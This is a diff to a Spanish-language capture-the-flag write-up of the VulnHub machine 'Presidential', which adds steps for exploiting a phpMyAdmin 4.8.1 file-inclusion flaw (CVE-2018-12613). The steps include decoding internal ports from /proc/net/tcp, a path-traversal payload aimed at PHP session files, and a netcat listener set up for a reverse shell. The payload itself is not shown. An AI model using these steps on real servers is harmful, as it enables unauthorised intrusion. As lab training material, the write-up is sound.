@@ -4,7 +4,7 @@ description: >-
 title: VulnHub - Presidential | (Difficulty Medium) - Linux
 date: 2025-02-07
 categories: [Writeup, VulnHub]
-tags: [vulnhub, hacking, linux, medium, writeup, redteam, pentesting]
+tags: [vulnhub, hacking, linux, medium, lfi, rce, phpmyadmin, capabilities, writeup, redteam, pentesting]
 image_post: true
 image: https://github.com/user-attachments/assets/bb94b984-cc01-4945-a8ba-7b5bd73cae7c
 ---
@@ -16,7 +16,7 @@ image: https://github.com/user-attachments/assets/bb94b984-cc01-4945-a8ba-7b5bd7
 * Subdomain Enumeration
 * phpMyAdmin Local File Inclusion
 * Internal Port Discovery through LFI (/proc/net/tcp)
-* Abusing phpMyAdmin 4.8.1 LFI to RCE (CVE-2018-12613)
+* Abusing phpMyAdmin 4.8.1 LFI to RCE via id_session (CVE-2018-12613)
 
 ## Enumeration
 
@@ -211,6 +211,28 @@ Utilizando el payload porporcionado consigo visualizar el fichero de configuraci
 
 Una vez acontecido el LFI enumero puertos internos de la máquina a través de /proc/net/tcp para detectar aquellos que no he podido en el escaneo de nmap ya que no se encuentran expuestos.
 
+![imagen](https://github.com/user-attachments/assets/72d141e8-f7c7-4664-ae52-66813206885d)
+
 ```bash
+cat ports | awk '{print $2}' | grep -v local_address | cut -d : -f 2 | sort -u | while read port;do echo "Port -> $((0x$port))";done
+Port -> 80
+Port -> 2082
+Port -> 3306
+Port -> 59060
+```
+
+Para migrar el LFI a un RCE intento apuntar a /var/log/apache2/access.log y /var/log/auth.log, pero no tengo capacidad de lectura, por lo que no puedo envenenar los logs de Apache ni SSH, me centro en seguir los pasos del exploit, basicamente en el apartado de consultas SQL podemos incrustar código PHP, este de primeras no será interpretado, pero el problema resida en que en la sesion se almacena todo lo que ejecutamos, por ello a través del LFI es posible apuntar a la sesión y ejecutar el código PHP, la ruta a apuntar es la siguiente:
 
 ```
+/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/session/sess_
+```
+
+Inicio un listener con netcat para entablar la reverse shell por el puerto 4444
+
+```bash
+ nc -lvnp 4444
+listening on [any] 4444 ...
+```
+
+Me dirijo a http://datasafe.votenow.local/ y en el apartado de consultas SQL incluyo una consulta SQL con código PHP que ejecuta un reverse shell hacia mi máquina atacante
+
